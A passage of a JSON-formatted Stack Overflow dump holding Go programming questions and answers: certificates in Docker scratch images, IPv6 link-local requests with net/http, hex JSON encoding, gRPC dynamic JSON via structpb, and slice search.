setup for Ubuntu 16.04.</p>\n"}, {"comments": [{"owner": {"reputation": 5283, "user_id": 663058, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/95a854e0c7ac05dd7d9ff04bc26c85d7?s=128&d=identicon&r=PG", "display_name": "CenterOrbit", "link": "https://stackoverflow.com/users/663058/centerorbit"}, "edited": false, "score": 0, "creation_date": 1585459391, "post_id": 52979541, "comment_id": 107763362, "body": "I was getting very odd behavior as soon as I containerized my app (which ran fine natively on both linux and windows) on a hunch that it was ca-certs and this answer completely fixed my issues!"}], "tags": [], "owner": {"reputation": 144207, "user_id": 596285, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b6975c494d3d9c404dd3d7af2edf3133?s=128&d=identicon&r=PG", "display_name": "BMitch", "link": "https://stackoverflow.com/users/596285/bmitch"}, "is_accepted": false, "score": 54, "last_activity_date": 1607997206, "last_edit_date": 1607997206, "creation_date": 1540425900, "answer_id": 52979541, "question_id": 52969195, "link": "https://stackoverflow.com/questions/52969195/docker-container-running-golang-http-client-getting-error-certificate-signed-by/52979541#52979541", "title": "Docker container running golang http.Client getting error `certificate signed by unknown authority`", "body": "<p>With scratch, you need to include the trusted certificates in addition to your application inside the image. E.g. if you have the ca-certificates.crt in your project to inject directly:</p>\n<pre><code>FROM scratch\nADD ca-certificates.crt /etc/ssl/certs/\nADD main /\nCMD [&quot;/main&quot;]\n</code></pre>\n<p>If you are using a multi stage build and only want the certificates packaged by the distribution vendor, that looks like:</p>\n<pre><code>FROM golang:alpine as build\n# Redundant, current golang images already include ca-certificates\nRUN apk --no-cache add ca-certificates\nWORKDIR /go/src/app\nCOPY . .\nRUN CGO_ENABLED=0 go-wrapper install -ldflags '-extldflags &quot;-static&quot;'\n\nFROM scratch\n# copy the ca-certificate.crt from the build stage\nCOPY --from=build /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/\nCOPY --from=build /go/bin/app /app\nENTRYPOINT [&quot;/app&quot;]\n</code></pre>\n"}], "owner": {"reputation": 621, "user_id": 2294667, "user_type": "registered", "accept_rate": 22, "profile_image": "https://www.gravatar.com/avatar/9a834b6b0c63e84c6e4f473161eec983?s=128&d=identicon&r=PG", "display_name": "Westy10101", "link": "https://stackoverflow.com/users/2294667/westy10101"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 7318, "favorite_count": 4, "answer_count": 2, "score": 23, "last_activity_date": 1607997206, "creation_date": 1540384660, "question_id": 52969195, "link": "https://stackoverflow.com/questions/52969195/docker-container-running-golang-http-client-getting-error-certificate-signed-by", "title": "Docker container running golang http.Client getting error `certificate signed by unknown authority`", "body": "<p>I created a docker container for talking to the google api using GoLang. I started off using a SCRATCH container and am getting the error <code>certificate signed by unknown authority</code> upon changing to ubuntu/alpine i still get the error. </p>\n\n<p><code>resp, err := client.Get(\"https://www.googleapis.com/oauth2/v3/userinfo\")\n</code></p>\n\n<p>Any help solving this issue would be great. I can run the code fine on my mac. </p>\n\n<p>Having done some research I can see the issue \n<a href=\"https://github.com/golang/go/issues/24652\" rel=\"noreferrer\">https://github.com/golang/go/issues/24652</a></p>\n\n<p>but I dont know if this is directly related or if I need to share some certificate with the container. </p>\n"}, {"tags": ["go"], "comments": [{"owner": {"reputation": 449, "user_id": 7623709, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/3b869731c724b20a6dd447a3f87121e6?s=128&d=identicon&r=PG&f=1", "display_name": "mike", "link": "https://stackoverflow.com/users/7623709/mike"}, "edited": false, "score": 0, "creation_date": 1540382670, "post_id": 52968401, "comment_id": 92843255, "body": "care to say what&#39;s the down-vote for?"}, {"owner": {"reputation": 89578, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 0, "creation_date": 1540387579, "post_id": 52968401, "comment_id": 92846650, "body": "I would suggest that you have no IPv6 support on your system - but nothing is known about your system."}, {"owner": {"reputation": 86274, "user_id": 32880, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/35b00dd652b316f6cd6bb5c12c5be999?s=128&d=identicon&r=PG", "display_name": "JimB", "link": "https://stackoverflow.com/users/32880/jimb"}, "edited": false, "score": 0, "creation_date": 1540392752, "post_id": 52968401, "comment_id": 92850419, "body": "You also have a link local address with no scope. What exactly are you expecting to connect to?"}, {"owner": {"reputation": 449, "user_id": 7623709, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/3b869731c724b20a6dd447a3f87121e6?s=128&d=identicon&r=PG&f=1", "display_name": "mike", "link": "https://stackoverflow.com/users/7623709/mike"}, "reply_to_user": {"reputation": 86274, "user_id": 32880, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/35b00dd652b316f6cd6bb5c12c5be999?s=128&d=identicon&r=PG", "display_name": "JimB", "link": "https://stackoverflow.com/users/32880/jimb"}, "edited": false, "score": 0, "creation_date": 1540439968, "post_id": 52968401, "comment_id": 92868440, "body": "@JimB I&#39;m discovering some devices(a/v equipment) using zeroconfig and some of them have ipv6 addresses thus the reason I&#39;m trying to connect to these ipv6 addresses"}], "answers": [{"tags": [], "owner": {"reputation": 8724, "user_id": 1068283, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/XZLfw.jpg?s=128&g=1", "display_name": "Michael Hampton", "link": "https://stackoverflow.com/users/1068283/michael-hampton"}, "is_accepted": false, "score": 1, "last_activity_date": 1540394687, "last_edit_date": 1540394687, "creation_date": 1540393802, "answer_id": 52972417, "question_id": 52968401, "link": "https://stackoverflow.com/questions/52968401/net-http-is-not-working-with-ipv6-address/52972417#52972417", "title": "net/http is not working with ipv6 address", "body": "<p>You're trying to connect to an IPv6 link-local address, but these require a scope ID to be valid. The scope ID is usually the interface name or number (e.g. <code>enp4s0</code> or <code>wlp5s0</code> on Linux; <code>3</code> or <code>12</code> on Windows).</p>\n\n<p>The <code>%</code> also needs to be escaped, because it appears in a URL. So it will appear as <code>%25</code>.</p>\n\n<p>So your URL should appear as:</p>\n\n<pre><code>url := \"http://[fe80::cf5:b02f:27c3:2abe%25interface]:7070/kw/\"\n</code></pre>\n\n<p>Where <code>interface</code> is your scope ID.</p>\n\n<hr>\n\n<p>Also note well that while <code>net/http</code> will happily make HTTP requests to IPv6 link-local address literals, web browsers will not. They will, however, connect to <em>names</em> which resolve to properly scoped link-local addresses. They will also connect to global (and ULA) IPv6 address literals. If you will eventually have a web browser involved in your project, keep this in mind.</p>\n"}], "owner": {"reputation": 449, "user_id": 7623709, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/3b869731c724b20a6dd447a3f87121e6?s=128&d=identicon&r=PG&f=1", "display_name": "mike", "link": "https://stackoverflow.com/users/7623709/mike"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 437, "favorite_count": 1, "answer_count": 1, "score": -2, "last_activity_date": 1540394687, "creation_date": 1540382171, "last_edit_date": 1540382657, "question_id": 52968401, "link": "https://stackoverflow.com/questions/52968401/net-http-is-not-working-with-ipv6-address", "title": "net/http is not working with ipv6 address", "body": "<p>I'm trying to make a \"GET\" request to a local ipv6 address (discovered via mdns). The issue is that the request <a href=\"https://play.golang.org/p/RMOi_B72fkq\" rel=\"nofollow noreferrer\">fails</a>. Why is that? </p>\n\n<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n)\n\nfunc main() {\n    url := \"http://[fe80::cf5:b02f:27c3:2abe]:7070/kw/\"\n    rsp, err := http.Get(url)\n    fmt.Println(rsp, err)\n}\n</code></pre>\n\n<p>Output</p>\n\n<pre><code>&lt;nil&gt; Get http://[fe80::cf5:b02f:27c3:2abe]:7070/kw/: dial tcp [fe80::cf5:b02f:27c3:2abe]:7070: socket: Unknown protocol\n</code></pre>\n"}, {"tags": ["json", "go"], "answers": [{"tags": [], "owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "is_accepted": false, "score": 0, "last_activity_date": 1540381272, "creation_date": 1540381272, "answer_id": 52968085, "question_id": 52967943, "link": "https://stackoverflow.com/questions/52967943/how-to-force-go-to-encode-8byte-as-hex-when-marshaling-to-json/52968085#52968085", "title": "How to force go to encode `[8]byte` as hex when marshaling to json", "body": "<blockquote>\n  <p>Is there a way to use hex string conversion for byte slices?</p>\n</blockquote>\n\n<p>No there is not.</p>\n\n<p>You have to encode it yourself. Either into a new struct with a string field or by writing your own UnmarshalJSON method as described in package json's doc.</p>\n"}, {"comments": [{"owner": {"reputation": 6345, "user_id": 483347, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/c2d980bc16657b17b4869229796fcd9d?s=128&d=identicon&r=PG", "display_name": "weberc2", "link": "https://stackoverflow.com/users/483347/weberc2"}, "edited": false, "score": 0, "creation_date": 1540392213, "post_id": 52969438, "comment_id": 92850046, "body": "Also, to use this, you can do <code>MyByteSlice(arr[:])</code> where <code>arr</code> is your byte array. This is how you make a slice from an array, which is basically taking a reference to your array."}], "tags": [], "owner": {"reputation": 4780, "user_id": 2133484, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5b491cf2d331464c4655247dc43e3d89?s=128&d=identicon&r=PG", "display_name": "Arman Ordookhani", "link": "https://stackoverflow.com/users/2133484/arman-ordookhani"}, "is_accepted": false, "score": 3, "last_activity_date": 1540385292, "creation_date": 1540385292, "answer_id": 52969438, "question_id": 52967943, "link": "https://stackoverflow.com/questions/52967943/how-to-force-go-to-encode-8byte-as-hex-when-marshaling-to-json/52969438#52969438", "title": "How to force go to encode `[8]byte` as hex when marshaling to json", "body": "<p>You could customize JSON serialization if you define a custom type. I've substitute <code>[]byte</code> for instance:</p>\n\n<p>Output:</p>\n\n<pre><code>{\"ByteSlice\":\"000000010203\",\"ByteArray\":[0,0,0,1,2,3]}\n</code></pre>\n\n<p>Code:</p>\n\n<pre><code>package main\n\nimport (\n    \"encoding/hex\"\n    \"encoding/json\"\n    \"fmt\"\n)\n\ntype MyByteSlice []byte\n\nfunc (m MyByteSlice) MarshalJSON() ([]byte, error) {\n    return json.Marshal(hex.EncodeToString(m))\n}\n\nfunc main() {\n    type Foo struct {\n        ByteSlice MyByteSlice\n        ByteArray [6]byte\n    }\n\n    foo := Foo {\n        ByteSlice: []byte{0, 0, 0, 1, 2, 3},\n        ByteArray: [6]byte{0, 0, 0, 1, 2, 3},\n    }\n\n    text, _ := json.Marshal(foo)\n    fmt.Printf(\"%s\\n\", text)\n}\n</code></pre>\n"}], "owner": {"reputation": 8088, "user_id": 282328, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/7b72e2f284edbf550703eaf56ea3370b?s=128&d=identicon&r=PG", "display_name": "Poma", "link": "https://stackoverflow.com/users/282328/poma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1033, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1540385292, "creation_date": 1540380848, "question_id": 52967943, "link": "https://stackoverflow.com/questions/52967943/how-to-force-go-to-encode-8byte-as-hex-when-marshaling-to-json", "title": "How to force go to encode `[8]byte` as hex when marshaling to json", "body": "<p>By default byte slices are marshalled as Base64 strings and byte arrays are converted as is:</p>\n\n<pre><code>func main() {\n    type Foo struct {\n        ByteSlice []byte\n        ByteArray [6]byte\n    }\n\n    foo := Foo {\n        ByteSlice: []byte{0, 0, 0, 1, 2, 3},\n        ByteArray: [6]byte{0, 0, 0, 1, 2, 3},\n    }\n    text, _ := json.Marshal(foo)\n    fmt.Printf(\"%s\", text)\n}\n</code></pre>\n\n<p>Output: </p>\n\n<pre><code>{\"ByteSlice\":\"AAAAAQID\",\"ByteArray\":[0,0,0,1,2,3]}\n</code></pre>\n\n<p>Is there a way to use hex string conversion for byte slices?</p>\n"}, {"tags": ["json", "go", "protocol-buffers", "grpc", "protoc"], "answers": [{"comments": [{"owner": {"reputation": 83, "user_id": 3224720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5f122d270b2de6bb1ed46c4514835f77?s=128&d=identicon&r=PG&f=1", "display_name": "Arajit", "link": "https://stackoverflow.com/users/3224720/arajit"}, "edited": false, "score": 1, "creation_date": 1578344677, "post_id": 53091998, "comment_id": 105401314, "body": "Any example on how to use <code>jsobpb</code> to a protot struct type would be helful"}], "tags": [], "owner": {"reputation": 577, "user_id": 7891992, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-CsP00wAm0dU/AAAAAAAAAAI/AAAAAAAAAfQ/oONOiaBIgXI/photo.jpg?sz=128", "display_name": "Doug Fawley", "link": "https://stackoverflow.com/users/7891992/doug-fawley"}, "is_accepted": false, "score": 3, "last_activity_date": 1541020164, "creation_date": 1541020164, "answer_id": 53091998, "question_id": 52966444, "link": "https://stackoverflow.com/questions/52966444/is-google-protobuf-struct-proto-the-best-way-to-send-dynamic-json-over-grpc/53091998#53091998", "title": "Is &quot;google/protobuf/struct.proto&quot; the best way to send dynamic JSON over GRPC?", "body": "<p>If you have JSON data already, you could also choose to encode it as a string field.  Otherwise, using a google.protobuf.Struct seems pretty reasonable, and you should be able to use <a href=\"https://godoc.org/github.com/golang/protobuf/jsonpb\" rel=\"nofollow noreferrer\">jsonpb</a> to convert between the Struct and JSON easily on the client and server.</p>\n"}, {"tags": [], "owner": {"reputation": 1226, "user_id": 1716905, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cf004baf04689322a8766ebc1efd5e07?s=128&d=identicon&r=PG&f=1", "display_name": "Luke", "link": "https://stackoverflow.com/users/1716905/luke"}, "is_accepted": false, "score": 4, "last_activity_date": 1587660387, "creation_date": 1587660387, "answer_id": 61392585, "question_id": 52966444, "link": "https://stackoverflow.com/questions/52966444/is-google-protobuf-struct-proto-the-best-way-to-send-dynamic-json-over-grpc/61392585#61392585", "title": "Is &quot;google/protobuf/struct.proto&quot; the best way to send dynamic JSON over GRPC?", "body": "<p>I ended up using a two-step conversion with <code>protojson</code>, from map to json to struct:</p>\n\n<pre class=\"lang-golang prettyprint-override\"><code>m := map[string]interface{}{\n  \"foo\":\"bar\",\n  \"baz\":123,\n}\nb, err := json.Marshal(m)\ns := &amp;structpb.Struct{}\nerr = protojson.Unmarshal(b, s)\n</code></pre>\n\n<p>I don't find it elegant but could not really find any official documentation of how to do this differently. I also prefer to produce structures using \"official\" functions rather than trying to build a structure myself.</p>\n"}, {"tags": [], "owner": {"reputation": 488, "user_id": 5789008, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84df850bc871c873225d0da16b5045bf?s=128&d=identicon&r=PG&f=1", "display_name": "F. Norbert", "link": "https://stackoverflow.com/users/5789008/f-norbert"}, "is_accepted": false, "score": 11, "last_activity_date": 1606411749, "creation_date": 1606411749, "answer_id": 65026774, "question_id": 52966444, "link": "https://stackoverflow.com/questions/52966444/is-google-protobuf-struct-proto-the-best-way-to-send-dynamic-json-over-grpc/65026774#65026774", "title": "Is &quot;google/protobuf/struct.proto&quot; the best way to send dynamic JSON over GRPC?", "body": "<p>Based on this proto file.</p>\n<pre><code>syntax = &quot;proto3&quot;;\npackage messages;\nimport &quot;google/protobuf/struct.proto&quot;;\n\nservice UserService {\n    rpc SendJson (SendJsonRequest) returns (SendJsonResponse) {}\n}\n\nmessage SendJsonRequest {\n    string UserID = 1;\n    google.protobuf.Struct Details = 2;\n}\n\nmessage SendJsonResponse {\n    string Response = 1;\n}\n</code></pre>\n<p>I think it is a good solution to use the <code>google.protobuf.Struct</code> type.</p>\n<p>The folks with their answers, helped me a lot at the beginning, so I would like to say thanks for your work! :) I really appreciate both solutions! :)\nOn the other hand, I think I found a better one to produce these kinds of <code>Structs</code>.</p>\n<h2>Anuj's Solution</h2>\n<p>This is a little bit overcomplicated but it can work.</p>\n<pre><code>var item = &amp;structpb.Struct{\n    Fields: map[string]*structpb.Value{\n        &quot;name&quot;: &amp;structpb.Value{\n            Kind: &amp;structpb.Value_StringValue{\n                StringValue: &quot;Anuj&quot;,\n            },\n        },\n        &quot;age&quot;: &amp;structpb.Value{\n            Kind: &amp;structpb.Value_StringValue{\n                StringValue: &quot;Anuj&quot;,\n            },\n        },\n    },\n}\n</code></pre>\n<h2>Luke's Solution</h2>\n<p>This is a shorter one but still require more conversion than necessary. <code>map[string]interface{} -&gt; bytes -&gt; Struct</code></p>\n<pre><code>m := map[string]interface{}{\n  &quot;foo&quot;:&quot;bar&quot;,\n  &quot;baz&quot;:123,\n}\nb, err := json.Marshal(m)\ns := &amp;structpb.Struct{}\nerr = protojson.Unmarshal(b, s)\n</code></pre>\n<h2>The solution from my perspective</h2>\n<p>My solution will use the official functions from the <code>structpb</code> package which is pretty well documented and user friendly.</p>\n<p><strong>Documentation:</strong> <a href=\"https://pkg.go.dev/google.golang.org/protobuf/types/known/structpb\" rel=\"noreferrer\">https://pkg.go.dev/google.golang.org/protobuf/types/known/structpb</a></p>\n<p>For example, this code creates a <code>*structpb.Struct</code> via the function that was designed to do this.</p>\n<pre><code>m := map[string]interface{}{\n    &quot;name&quot;: &quot;Anuj&quot;,\n    &quot;age&quot;:  23,\n}\n\ndetails, err := structpb.NewStruct(m) // Check to rules below to avoid errors\nif err != nil {\n    panic(err)\n}\n\nuserGetRequest := &amp;pb.SendJsonRequest{\n    UserID: &quot;A123&quot;,\n    Details: details,\n}\n</code></pre>\n<p>One of the most important thing, that we should keep in mind when we are building <code>Struct</code> from a <code>map[string]interface{}</code> is this:</p>\n<p><a href=\"https://pkg.go.dev/google.golang.org/protobuf/types/known/structpb#NewValue\" rel=\"noreferrer\">https://pkg.go.dev/google.golang.org/protobuf/types/known/structpb#NewValue</a></p>\n<pre><code>// NewValue constructs a Value from a general-purpose Go interface.\n//\n//  \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2564\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n//  \u2551 Go type                \u2502 Conversion                                 \u2551\n//  \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563\n//  \u2551 nil                    \u2502 stored as NullValue                        \u2551\n//  \u2551 bool                   \u2502 stored as BoolValue                        \u2551\n//  \u2551 int, int32, int64      \u2502 stored as NumberValue                      \u2551\n//  \u2551 uint, uint32, uint64   \u2502 stored as NumberValue                      \u2551\n//  \u2551 float32, float64       \u2502 stored as NumberValue                      \u2551\n//  \u2551 string                 \u2502 stored as StringValue; must be valid UTF-8 \u2551\n//  \u2551 []byte                 \u2502 stored as StringValue; base64-encoded      \u2551\n//  \u2551 map[string]interface{} \u2502 stored as StructValue                      \u2551\n//  \u2551 []interface{}          \u2502 stored as ListValue                        \u2551\n//  \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2567\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n//\n// When converting an int64 or uint64 to a NumberValue, numeric precision loss\n// is possible since they are stored as a float64.\n</code></pre>\n<p>For example, if you would like to produce a <code>Struct</code> that has a string list in its JSON form, you should create the following <code>map[string]interface{}</code></p>\n<pre><code>m := map[string]interface{}{\n    &quot;name&quot;: &quot;Anuj&quot;,\n    &quot;age&quot;:  23,\n    &quot;cars&quot;: []interface{}{\n        &quot;Toyota&quot;,\n        &quot;Honda&quot;,\n        &quot;Dodge&quot;,\n    }\n}\n</code></pre>\n<p>Sorry for the long post, I hope it makes your work easier with <code>proto3</code> and <code>Go</code>! :)</p>\n"}], "owner": {"reputation": 181, "user_id": 6215351, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c0143be280b8f8f5c717fc699b465be?s=128&d=identicon&r=PG", "display_name": "Anuj Gupta", "link": "https://stackoverflow.com/users/6215351/anuj-gupta"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 14964, "favorite_count": 5, "answer_count": 3, "score": 18, "last_activity_date": 1606411749, "creation_date": 1540376193, "last_edit_date": 1603535836, "question_id": 52966444, "link": "https://stackoverflow.com/questions/52966444/is-google-protobuf-struct-proto-the-best-way-to-send-dynamic-json-over-grpc", "title": "Is &quot;google/protobuf/struct.proto&quot; the best way to send dynamic JSON over GRPC?", "body": "<p>I have a written a simple GRPC server and a client to call the server (both in Go). Please tell me if using golang/protobuf/struct is the best way to send a dynamic JSON with GRPC.\nIn the example below, earlier I was creating <code>Details</code> as a <code>map[string]interface{}</code> and serializing it. Then I was sending it in protoMessage as <code>bytes</code> and was de-serializing the message on the server side.</p>\n<p>Is it the best/efficient way to do it or should I define Details as a struct in my proto file?</p>\n<p>Below is User.proto file</p>\n<pre><code>syntax = &quot;proto3&quot;;\npackage messages;\nimport &quot;google/protobuf/struct.proto&quot;;\n\nservice UserService {\n    rpc SendJson (SendJsonRequest) returns (SendJsonResponse) {}\n}\n\nmessage SendJsonRequest {\n    string UserID = 1;\n    google.protobuf.Struct Details = 2;\n}\n\nmessage SendJsonResponse {\n    string Response = 1;\n}\n</code></pre>\n<p>Below is client.go file</p>\n<pre><code>package main\nimport (\n    &quot;context&quot;\n    &quot;flag&quot;\n    pb &quot;grpc-test/messages/pb&quot;\n    &quot;log&quot;\n    &quot;google.golang.org/grpc&quot;\n)\n\nfunc main() {\n    var serverAddr = flag.String(&quot;server_addr&quot;, &quot;localhost:5001&quot;, &quot;The server address in the format of host:port&quot;)\n    opts := []grpc.DialOption{grpc.WithInsecure()}\n    conn, err := grpc.Dial(*serverAddr, opts...)\n    if err != nil {\n        log.Fatalf(&quot;did not connect: %s&quot;, err)\n    }\n    defer conn.Close()\n\n    userClient := pb.NewUserServiceClient(conn)\n    ctx := context.Background()\n\n    sendJson(userClient, ctx)\n}\n\nfunc sendJson(userClient pb.UserServiceClient, ctx context.Context) {\n    var item = &amp;structpb.Struct{\n        Fields: map[string]*structpb.Value{\n            &quot;name&quot;: &amp;structpb.Value{\n                Kind: &amp;structpb.Value_StringValue{\n                    StringValue: &quot;Anuj&quot;,\n                },\n            },\n            &quot;age&quot;: &amp;structpb.Value{\n                Kind: &amp;structpb.Value_StringValue{\n                    StringValue: &quot;Anuj&quot;,\n                },\n            },\n        },\n    }\n\n    userGetRequest := &amp;pb.SendJsonRequest{\n        UserID: &quot;A123&quot;,\n        Details: item,\n    }\n\n    res, err := userClient.SendJson(ctx, userGetRequest)\n}\n</code></pre>\n"}, {"tags": ["arrays", "loops", "go", "slice"], "comments": [{"owner": {"reputation": 1604, "user_id": 3351097, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/yInN3.jpg?s=128&g=1", "display_name": "Maxian Nicu", "link": "https://stackoverflow.com/users/3351097/maxian-nicu"}, "edited": false, "score": 4, "creation_date": 1540373202, "post_id": 52965413, "comment_id": 92837344, "body": "There, golang has no method for this. You can read more <a href=\"https://stackoverflow.com/a/38654444/3351097\">here</a>"}, {"owner": {"reputation": 43, "user_id": 10544250, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d3a5e7589914ba517a86b0afead9e72?s=128&d=identicon&r=PG&f=1", "display_name": "Doe", "link": "https://stackoverflow.com/users/10544250/doe"}, "reply_to_user": {"reputation": 1604, "user_id": 3351097, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/yInN3.jpg?s=128&g=1", "display_name": "Maxian Nicu", "link": "https://stackoverflow.com/users/3351097/maxian-nicu"}, "edited": false, "score": 0, "creation_date": 1540373556, "post_id": 52965413, "comment_id": 92837553, "body": "@MaxianNicu <a href=\"https://play.golang.org/p/PGx3gRSgjMx\" rel=\"nofollow noreferrer\">play.golang.org/p/PGx3gRSgjMx</a> this is a playground and please tell me how I implement it in my code"}, {"owner": {"reputation": 193, "user_id": 9957458, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YonLx.jpg?s=128&g=1", "display_name": "Radu Ciurlea", "link": "https://stackoverflow.com/users/9957458/radu-ciurlea"}, "edited": false, "score": 1, "creation_date": 1540379121, "post_id": 52965413, "comment_id": 92840958, "body": "One way or another, the for loop is unavoidable. You need to at least look at the values in the slice once to tell if it&#39;s there or not, which takes a loop or something similar in complexity (O(n) that is). If you think it&#39;s repetitive or boring to look at, you can just abstract it away in a function."}], "answers": [{"tags": [], "owner": {"reputation": 284620, "user_id": 1705598, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/aTFoe.jpg?s=128&g=1", "display_name": "icza", "link": "https://stackoverflow.com/users/1705598/icza"}, "is_accepted": false, "score": 2, "last_activity_date": 1540393607, "last_edit_date": 1540393607, "creation_date": 1540373792, "answer_id": 52965679, "question_id": 52965413, "link": "https://stackoverflow.com/questions/52965413/is-there-any-function-in-golang-that-will-find-the-value-is-in-array-or-not/52965679#52965679", "title": "Is there any function in golang that will find the value is in array or not?", "body": "<p>Without a <code>for</code> loop, no<sup>*</sup> (see <a href=\"https://stackoverflow.com/questions/38654383/how-to-search-for-an-element-in-a-golang-slice/38654444#38654444\">How to search for an element in a golang slice</a>), but... what do you have against <code>for</code> loops? Why can't you use loops for this? This question is like <em>\"can I do it without coding\"</em>?</p>\n\n<p><sup>* Actually you <em>could</em> do it without a <code>for</code> loop using a recursive function, but that is good only for educational purposes, and is worthless for practical purposes. See solution at the end of the answer.</sup></p>\n\n<p>There is no ready function for this in the standard library, but this is how easy it is to create one yourself:</p>\n\n<pre><code>func find(what interface{}, where []interface{}) (idx int) {\n    for i, v := range where {\n        if v == what {\n            return i\n        }\n    }\n    return -1\n}\n</code></pre>\n\n<p>And using it:</p>\n\n<pre><code>what := 10\nwhere := []interface{}{1, 2, 3, 10, 5}\nfmt.Println(find(what, where))\n</code></pre>\n\n<p>Output (try it on the <a href=\"https://play.golang.org/p/27mPxlzadRJ\" rel=\"nofollow noreferrer\">Go Playground</a>):</p>\n\n<pre><code>3\n</code></pre>\n\n<p>Also note that it would be faster and more convenient to use <code>[]int</code> slice type instead of <code>[]interface{}</code>:</p>\n\n<pre><code>func find(what int, where []int) (idx int) {\n    for i, v := range where {\n        if v == what {\n            return i\n        }\n    }\n    return -1\n}\n</code></pre>\n\n<p>And then using it:</p>\n\n<pre><code>what := 10\nwhere := []int{1, 2, 3, 10, 5}\nfmt.Println(find(what, where))\n</code></pre>\n\n<p>Output is the same. Try this one on the <a href=\"https://play.golang.org/p/b6a2AlkkClz\" rel=\"nofollow noreferrer\">Go Playground</a>.</p>\n\n<p>You could create a function that accepts slices of any type using the <code>interface{}</code> type, but that would require reflection to implement it, which would be slower and not worthy to be used. Instead just create a function with concrete slice types if you need, or just use the <code>for</code> loop in place.</p>\n\n<p>For completeness, here's the solution that uses no <code>for</code> loops but a recursive function. This is here only for educational purposes, the solutions above are superior to this:</p>\n\n<pre><code>func find(what int, where []int) (idx int) {\n    if len(where) == 0 {\n        return -1\n    }\n    if what == where[0] {\n        return 0\n    }\n    if idx = find(what, where[1:]); idx &lt; 0 {\n        return -1 // Not found in the rest of the slice\n    }\n    return 1 + idx\n}\n</code></pre>\n\n<p>Try this one on the <a href=\"https://play.golang.org/p/e3jYJenSnvV\" rel=\"nofollow noreferrer\">Go Playground</a>.</p>\n"}], "owner": {"reputation": 43, "user_id": 10544250, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d3a5e7589914ba517a86b0afead9e72?s=128&d=identicon&r=PG&f=1", "display_name": "Doe", "link": "https://stackoverflow.com/users/10544250/doe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1667, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1540393607, "creation_date": 1540373009, "last_edit_date": 1540373920, "question_id": 52965413, "link": "https://stackoverflow.com/questions/52965413/is-there-any-function-in-golang-that-will-find-the-value-is-in-array-or-not", "title": "Is there any function in golang that will find the value is in array or not?", "body": "<p>Suppose there is an slice having integers in it. And we have declared a variable which contains a integer value then I have to find the value from that slice without using for loop.</p>\n\n<p>Using for loop I do like this:-</p>\n\n<pre><code>package main\n\nimport (\n   \"fmt\"\n)\n\nfunc main() {\n  value := 10\n  var interf 